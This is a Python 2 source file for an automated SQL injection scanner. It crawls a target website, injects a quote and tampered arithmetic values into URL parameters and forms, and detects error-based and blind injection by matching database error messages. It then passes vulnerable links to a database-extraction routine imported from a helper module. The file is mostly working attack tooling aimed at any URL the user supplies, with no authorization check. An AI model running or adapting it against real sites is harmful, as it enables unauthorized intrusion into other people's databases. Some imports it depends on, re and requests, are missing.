import datetime
import urllib
import urlparse
from BeautifulSoup import *
import sys
import cgi
from funxs import *

# VARIABLES
wrn = "[WARNING]"
inf = "[INFO]"


# Colors for print
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


# Function that return the exact date n time
def tm():
    return "["+datetime.datetime.now().time().strftime('%H:%M:%S')+"]"


# <!==================================================!>
# SQL INJECTION!!!
def sql():
    # VARIABLES
    skata = ""   # For testing and only
    vul_page = ""       # Initializing
    vul_found = False   # A flag to end the process
    entire = False  # For the entire website
    single_page = False   # For scanning a single page
    scan_form = False   # For scanning forms
    given_links = list()    # The links given for form scanning
    form_list = {}  # Links which contain forms
    vuln_links = {}     # Links arising out of forms
    ispossible_msg = True   # To avoid double printing if a link is vulnerable or not
    errors = {
        'MySQL': 'error in your SQL syntax',
        'SQLi_err': 'access shop category information',
        'MySQL_Valid_Argument': 'Supplied argument is not a valid MySQL result resource in',
        'MySQL_fetch': 'mysql_fetch_assoc()',
        'MySQL_array': 'mysql_fetch_array()',
        'MySQL_result': 'mysql_free_result()',
        'MySQL_start': 'session_start()',
        'MYSQL': 'getimagesize()',
        'MySQL_call': 'Call to a member function',
        'Oracle1': 'Microsoft OLE DB Provider for Oracle',
        'Mysql_re': 'Warning: require()',
        'MysQl_11': 'array_merge()',
        'MySQLi': 'mysql_query()',
        'Oracle': 'ORA-01756',
        'MiscError': 'SQL Error',
        'MiscError2': 'mysql_fetch_row',
        'MiscError3': 'num_rows',
        'JDBC_CFM': 'Error Executing Database Query',
        'JDBC_CFM2': 'SQLServer JDBC Driver',
        'MSSQL_OLEdb': 'Microsoft OLE DB Provider for SQL Server',
        'MSSQL_Uqm': 'Unclosed quotation mark',
        'MS-Access_ODBC': 'ODBC Microsoft Access Driver',
        'Postgrey_error': 'An error occurred',
        'SQL_errore': 'Unknown Column',
        'MS-Access_JETdb': 'Microsoft JET Database'
    }
    # If ever needed to read mysql versions from the file.
    """
    mysql_versions = list()   # Reading mysql versions from a file.
    try:
        file_versions = open('db_versions/mysql_versions.txt', 'r')
    except:     # If the file is missing.
        print "There might have been a problem during the installation and one or more files are corrupted. " \
              "Please try reinstalling the program."
        exit()
    for fv in file_versions:
        mysql_versions.append(fv[:-1])
    """

    # Automatically search the entire web page, manually a single page or manually a form
    while True:
        print "1. Scan the entire Website"
        print "2. Scan single Page"
        print "3. Scan Forms"
        ch = raw_input("")
        print ""
        if ch == "1":
            entire = True
            break
        if ch == "2":
            single_page = True
            break
        if ch == "3":
            scan_form = True
            break

    # 1. CHECKING THE ENTIRE WEBSITE AUTOMATICALLY
    if entire:
        while True:     # Checks if url is correct
            url = (raw_input('Enter URL: ')).strip()
            print ".........."
            if "http://" in url:
                break
            elif "https://" in url:
                break
            else:
                print "Wrong input given!\n"
        while True:     # Quick or intensive scan
            ch = raw_input("Quick scan? [y/N]: ")
            if ch == "y" or ch == "Y":    # Ignores the links based on the same page (e.g, info.jsp?id=1, info.jsp?id=2)
                quick = True
                break
            if ch == "N" or ch == "n":
                quick = False
                break
        while True:     # Checking the entire site for Forms
            ch = raw_input("Do you wan to scan Forms too? [y/N]: ")
            if ch == "y" or ch == "Y":
                entire_form = True
                break
            if ch == "N" or ch == "n":
                entire_form = False
                break
        # scrapping the website
        urls = [url]    # A list that all the links are going to be held initialized with the original url
        visited = [url]     # A list that keeps all the visited links
        all_links = list()  # Contains all the links of the website
        all_links.append(url)   # Initializing with the firs link (usually the home page))
        incl_url = url.split("/")[2]  # A basic snippet of the original url tha must be included to all the links
        prev_url = list()   # A list that keeps the double links if Quick scan selected
        c_name = list()     # Cookie names
        c_value = list()    # Cookie values

        # For all the links of the web page
        print "Scraping...\n"
        print "Press Enter to continue without cookie"
        cookies = (raw_input('Enter cookies: ')).strip()
        print ""
        c_split = cookies.split(" ")
        for c in c_split:
            c_name.append(c[:c.find('=')])
            c_value.append(c[c.find('=')+1:])
        cookies_dict = dict(zip(c_name, c_value))
        del c_name[:]
        del c_value[:]
        while len(urls) > 0:
            try:
                if cookies == "":
                    html = urllib.urlopen(urls[0]).read()
                else:
                    html = requests.get(urls[0], cookies=cookies_dict).text
            except:
                urls.pop(0)  # Removes the old urls
                # print "Is not stable."
                continue
            soup = BeautifulSoup(html)
            urls.pop(0)  # Removes the old urls
            links = soup('a', href=True)
            for link in links:
                new_page = urlparse.urljoin(url, link.get('href', None))    # Join the original url with the new link
                # print new_page    # Debugging
                if incl_url in new_page and new_page not in visited:
                    if quick:
                        if "?" in new_page and new_page[:new_page.rfind('?')] in prev_url:    # Avoid double checking the same URL
                            continue
                        if "?" in new_page and new_page[:new_page.rfind('?')] not in prev_url:     # Avoid double checking the same URL
                            prev_url.append(new_page[:new_page.rfind('?')])
                    all_links.append(new_page)
                    if re.search("="+r'[a-zA-Z0-9-~!@#$%^&*()_+{}":;\']+$', new_page):    # Checks if the new url ends with (e.g, =33 or =ex ...)
                        # //////////
                        # Nomizo edo ine kala, An i new_page ine idia me tin proigoumeni mexri kai to (=), tote mpoulo.
                        # By removing the lines bellow, we scrapping the website.
                        # //////////
                        # First check - Filters free (payload is ')
                        q = "'"
                        my_url = new_page + q
                        try:
                            # Trying error messages.
                            if cookies == "": new_html = urllib.urlopen(my_url).read()
                            else: new_html = requests.get(my_url, cookies=cookies_dict).text
                            for key, value in errors.items():
                                if re.search(value, new_html):
                                    vul_page = new_page     # Vulnerable link
                                    vuln_links.update({vul_page: "GET"})
                                    vul_found = True
                                    break
                                else:
                                    continue
                        except:
                            continue

                        # Second check - Checks if Quotes and Apostrophes are filtered (payload is a mathematical expression)
                        if not vul_found:
                            int_check = new_page[new_page.rfind('=')+1:]
                            if int_check.isdigit():
                                int_check = int(int_check) + 1
                                tampered_url = new_page.replace(new_page[new_page.rfind('=')+1:], "") + int_check.__str__() + "-1"
                                if cookies == "":
                                    html = urllib.urlopen(new_page).read()   # URL as it is
                                    html_compare = urllib.urlopen(tampered_url).read()  # URL with payload
                                    # print tm(), inf, new_page+"-1"   # DEBUGGING
                                    # print new_page
                                    # print tampered_url
                                else:
                                    html = requests.get(new_page, cookies=cookies_dict).text
                                    html_compare = requests.get(tampered_url, cookies=cookies_dict).text
                                    # print tm(), inf, new_page+"-1"   # DEBUGGING
                                    # print new_page
                                    # print tampered_url
                                if html == html_compare:     # Checking pages for differences
                                    print ""
                                    print tm(), wrn, "Seems like apostrophes and quotation marks are screened with backslashes."
                                    print tm(), inf, "Trying another method."
                                    print tm(), inf, "Original URL:", new_page
                                    print tm(), inf, "Injected URL:", tampered_url
                                    print ""
                                    vul_page = new_page     # Vulnerable link
                                    vuln_links.update({vul_page: "GET"})
                                    vul_found = True
                        # Quiting the loop when vulnerability found
                        if vul_found:
                            break
                        # By removing the lines above, we scrapping the website.
                        urls.append(new_page)
                        visited.append(new_page)
        # print "visited", visited  # Debugging
        # print "all links", all_links  # Debugging
        # Checking for vulnerable Forms only if there are no vulnerable pages
        if entire_form:
            if not vul_found:
                ispossible_msg = False
                form_list = find_forms(all_links, show_messages=False)
                if form_list:
                    vuln_links = find_sql_vul(form_list)
                else:
                    print "There are no forms"
                if vuln_links:
                    vul_found = True
        if vul_found:
            if ispossible_msg:  # To avoid double printing if a link is vulnerable or not
                print tm(), inf, "Vulnerability found in url:", vul_page
                print tm(), inf, "SQL injection is possible!"
                print tm(), inf, "Error type:", key
                print tm(), inf, "Injection type: error-based"
            # vul_page = vul_page[:vul_page.rfind('=')+1] + "-" + vul_page[vul_page.rfind('=')+1:]    # Adding - after =
            find_db_info(vuln_links)
        else:
            if ispossible_msg:  # To avoid double printing if a link is vulnerable or not
                print tm(), inf, "SQL Injection is not possible"
            exit()

    # 2. CHECKING A SINGLE PAGE
    if single_page:
        while True:  # Checks if url is correct
            url = (raw_input('Enter URL: ')).strip()
            print ".........."
            if re.search("="+r'[a-zA-Z0-9-~!@#$%^&*()_+{}":;\']+$', url) and "http://" in url:
                break
            elif re.search("="+r'[a-zA-Z0-9-~!@#$%^&*()_+{}":;\']+$', url) and "https://" in url:
                break
            else:
                print "Wrong input given!\n"
        # First check - Filters free (payload is ')
        q = "'"                 # Payload
        new_page = url + q      # URL with payload
        c_name = list()         # Cookie name
        c_value = list()        # Cookie value
        try:
            print tm(), inf, "Connecting to the URL..."
            print "Press Enter to continue without cookie"
            cookies = (raw_input('Enter cookies: ')).strip()
            print ""
            c_split = cookies.split(" ")
            for c in c_split:
                c_name.append(c[:c.find('=')])
                c_value.append(c[c.find('=')+1:])
            cookies_dict = dict(zip(c_name, c_value))
            del c_name[:]
            del c_value[:]
            if cookies == "":
                html = urllib.urlopen(new_page).read()
            else:
                html = requests.get(new_page, cookies=cookies_dict).text
            print tm(), inf, "Target URL is stable..."
            print "..........\n.........."
            print tm(), inf, "Injecting malicious code into the URL..."
            print tm(), inf, "Injected URL:", new_page
            print tm(), inf, "Testing for SQL injection..."

            # Trying error messages.
            for key, value in errors.items():
                if re.search(value, html):
                    print "\n", tm(), inf, "SQL injection is possible!"
                    print tm(), inf, "Error type:", key
                    print tm(), inf, "Injection type: error-based"
                    vul_page = url
                    vul_found = True
                    break
                else:
                    print tm(), inf, "Trying ", key+"..."
        except:
            print tm(), wrn, "Target URL is not stable!!!"
            print tm(), wrn, "Make sure you are connected to the internet.\n"

        # Second check - Checks if Quotes and Apostrophes are filtered (payload is a mathematical expression)
        if not vul_found:
            int_check = url[url.rfind('=')+1:]
            if int_check.isdigit():
                int_check = int(int_check) + 1
                tampered_url = url.replace(url[url.rfind('=')+1:], "") + int_check.__str__() + "-1"
                if cookies == "":
                    html = urllib.urlopen(url).read()   # URL as it is
                    html_compare = urllib.urlopen(tampered_url).read()  # URL with payload
                    # print tm(), inf, url+"-1"    # DEBUGGING
                    # print url
                    # print tampered_url
                else:
                    html = requests.get(url, cookies=cookies_dict).text
                    html_compare = requests.get(tampered_url, cookies=cookies_dict).text
                    # print tm(), inf, url+"-1"    # DEBUGGING
                    # print url
                    # print tampered_url
                if html == html_compare:     # Checking pages for differences
                    print ""
                    print tm(), wrn, "Seems like apostrophes and quotation marks are screened with backslashes."
                    print tm(), inf, "Trying another method."
                    print tm(), inf, "Original URL:", url
                    print tm(), inf, "Injected URL:", tampered_url
                    print ""
                    print tm(), inf, "SQL injection is possible!"
                    print tm(), inf, "Error type: disabled"
                    print tm(), inf, "Injection type: blind"
                    vul_page = url
                else:
                    print ""
                    print tm(), inf, "SQL Injection is not possible"
                    exit()
        # vul_page = vul_page[:vul_page.rfind('=')+1] + "-" + vul_page[vul_page.rfind('=')+1:]    # Adding - after =
        vuln_links.update({vul_page: "GET"})
        find_db_info(vuln_links)

    # 3. CHECKING FORMS
    if scan_form:
        all_forms = False
        single_form = False
        while True:
            print "1. Scan the entire Website"
            print "2. Scan single Page"
            ch = raw_input("")
            print ""
            if ch == "1":
                all_forms = True
                break
            if ch == "2":
                single_form = True
                break
        while True:     # Checks if url is correct
            url = (raw_input('Enter URL: ')).strip()
            print ".........."
            if "http://" in url:
                break
            elif "https://" in url:
                break
            else:
                print "Wrong input given!\n"
        while True:     # Quick or intensive scan
            ch = raw_input("Quick scan? [y/N]: ")
            if ch == "y" or ch == "Y":    # Ignores the links based on the same page (e.g, info.jsp?id=1, info.jsp?id=2)
                quick = True
                break
            if ch == "N" or ch == "n":
                quick = False
                break
        while True:     # Shows the details of the Form
            ch = raw_input("Show Form details? [y/N]: ")
            if ch == "y" or ch == "Y":
                show_messages = True
                print ""
                break
            if ch == "N" or ch == "n":
                show_messages = False
                print ""
                break
        if all_forms:
            given_links = crawler(url, quick)
        if single_form:
            given_links.append(url)
        form_list = find_forms(given_links, show_messages)
        if not form_list:
            print"There are no forms"
            exit()
        vuln_links = find_sql_vul(form_list)
        if not vuln_links:
            print"There are no vulnerable forms"
            exit()
        find_db_info(vuln_links)
        exit()
